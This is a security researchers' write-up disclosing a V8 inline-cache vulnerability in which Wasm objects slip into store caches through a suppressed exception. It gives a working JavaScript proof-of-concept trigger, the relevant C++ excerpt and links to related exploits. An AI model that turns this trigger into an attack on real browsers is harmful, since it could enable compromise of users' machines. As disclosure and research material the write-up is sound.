author: [@mistymntncop](https://x.com/mistymntncop), [@buptsb](https://x.com/buptsb)
2024-06-04 19:45:52

_This writeup is the FIRST public disclosure for this vulnerability._

# Info
[ic] Use slow stub element handler for non-JSObjects
https://chromium-review.googlesource.com/c/v8/v8/+/5527898

![image](https://github.com/buptsb/blog/assets/666724/822a138e-2e18-4a40-ae07-17661fb83baa)

# PoC
https://gist.github.com/mistymntncop/b6599b24cf57fb1b5c5be63a2f702015

```js
d8.file.execute("wasm-module-builder.js");

let builder = new WasmModuleBuilder();

let array_type = builder.addArray(kWasmI32, true);
builder.addFunction('create_array', makeSig([kWasmI32], [wasmRefType(array_type)]))
    .addBody([
        kExprLocalGet, 0,
        kGCPrefix, kExprArrayNewDefault, array_type,
    ])
.exportFunc();

let wasm_instance = builder.instantiate({});
let wasm = wasm_instance.exports;


function set_keyed_prop(arr, key, val) {
    arr[key] = val;
}

function pwn() {
    for(let i = 0; i < 9; i++) {
        set_keyed_prop([], 0, 0x1337);
    }
    let wasm_array = wasm.create_array(0);

    try {
        set_keyed_prop(wasm_array, "foo", 0x1337);
    } catch(err){ }
    set_keyed_prop([], 0, 0x1337);
    
    %DebugPrint(set_keyed_prop);
    
    try {
        set_keyed_prop(wasm_array, 0, 0x1337);
    } catch(err){ }
    
}
pwn();
```
![image](https://github.com/buptsb/blog/assets/666724/c3a5b520-c05e-465d-ad01-9c148a59941f)

# Analysis

## using try...catch to set ic handler

As we all know, set property on `WasmObjects` would throw `MessageTemplate::kWasmObjectsAreOpaque` error.

But `UpdateCaches` is called before `Object::SetProperty`, so we could add `WasmObject` to IC just with a try...catch to suppress the error.

```C++
MaybeHandle<Object> StoreIC::Store(Handle<Object> object, Handle<Name> name,
                                   Handle<Object> value,
                                   StoreOrigin store_origin) {
  ...
  if (use_ic) {
    UpdateCaches(&it, value, store_origin);    <------ 1
  } else if (state() == NO_FEEDBACK) {
    ...
  }

  if (IsAnyDefineOwn()) {
    ...
  } else {
    MAYBE_RETURN_NULL(Object::SetProperty(&it, value, store_origin)); <------ 2
  }
}
```

## polymorphic IC exploit

Please checkout [@mistymntncop](https://x.com/mistymntncop)'s writeup about [CVE-2023-3079](https://github.com/mistymntncop/CVE-2023-3079), and my poc about [CVE-2023-4762](https://x.com/buptsb/status/1706984650927968501),
it's basicly same exploit technique using v8 polymorphic IC, can't believe it's still exploitable!

